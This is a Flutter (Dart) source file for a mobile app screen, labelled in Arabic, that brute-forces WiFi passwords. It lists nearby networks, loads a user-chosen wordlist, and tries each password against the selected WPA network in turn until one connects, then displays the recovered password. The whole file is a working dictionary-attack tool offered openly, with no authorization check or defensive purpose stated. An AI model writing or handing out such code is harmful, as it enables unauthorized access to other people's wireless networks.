import 'dart:async';
import 'dart:io';
import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:wifi_iot/wifi_iot.dart';

class LiveBruteForceScreen extends StatefulWidget {
  const LiveBruteForceScreen({super.key});

  @override
  State<LiveBruteForceScreen> createState() => _LiveBruteForceScreenState();
}

class _LiveBruteForceScreenState extends State<LiveBruteForceScreen> {
  List<WifiNetwork> networks = [];
  String? selectedSSID;
  List<String> passwords = [];
  String status = '';
  bool loading = false;
  int currentIndex = 0;

  @override
  void initState() {
    super.initState();
    _loadNetworks();
  }

  Future<void> _loadNetworks() async {
    final list = await WiFiForIoTPlugin.loadWifiList();
    setState(() {
      networks = list ?? [];
    });
  }

  Future<void> _pickWordlist() async {
    final result = await FilePicker.platform.pickFiles();
    if (result != null) {
      final file = File(result.files.single.path!);
      final lines = await file.readAsLines();
      setState(() {
        passwords = lines.where((e) => e.trim().isNotEmpty).toList();
      });
    }
  }

  Future<void> _startBruteForce() async {
    if (selectedSSID == null || passwords.isEmpty) return;

    setState(() {
      loading = true;
      currentIndex = 0;
      status = '🧪 بدء التخمين على $selectedSSID ...';
    });

    for (final pass in passwords) {
      setState(() {
        status = '🔐 محاولة الاتصال بكلمة المرور: $pass';
      });

      final connected = await WiFiForIoTPlugin.connect(
        selectedSSID!,
        password: pass,
        joinOnce: true,
        security: NetworkSecurity.WPA,
      );

      await Future.delayed(const Duration(seconds: 5));

      final isConnected = await WiFiForIoTPlugin.isConnected();

      if (isConnected) {
        setState(() {
          status = '✅ تم الاتصال بنجاح!\n📶 كلمة المرور الصحيحة هي: $pass';
          loading = false;
        });
        return;
      }

      currentIndex++;
    }

    setState(() {
      status = '❌ فشل في العثور على كلمة المرور الصحيحة بعد ${passwords.length} محاولة.';
      loading = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("🧠 التخمين المباشر لشبكات WiFi")),
      body: Padding(
        padding: const EdgeInsets.all(12.0),
        child: Column(
          children: [
            const Text("1️⃣ اختر الشبكة:"),
            DropdownButton<String>(
              isExpanded: true,
              value: selectedSSID,
              hint: const Text("اختر الشبكة"),
              items: networks
                  .map((wifi) => DropdownMenuItem(
                        value: wifi.ssid,
                        child: Text(wifi.ssid ?? "غير معروفة"),
                      ))
                  .toList(),
              onChanged: (val) => setState(() => selectedSSID = val),
            ),
            const SizedBox(height: 10),
            ElevatedButton.icon(
              icon: const Icon(Icons.file_present),
              label: const Text("2️⃣ اختر ملف كلمات المرور"),
              onPressed: _pickWordlist,
            ),
            Text("✅ كلمات محملة: ${passwords.length}"),
            const SizedBox(height: 20),
            ElevatedButton.icon(
              icon: const Icon(Icons.play_arrow),
              label: const Text("3️⃣ ابدأ التخمين"),
              onPressed: loading ? null : _startBruteForce,
            ),
            const SizedBox(height: 20),
            Expanded(
              child: SingleChildScrollView(
                child: Text(
                  status,
                  style: const TextStyle(color: Colors.green, fontFamily: "monospace"),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
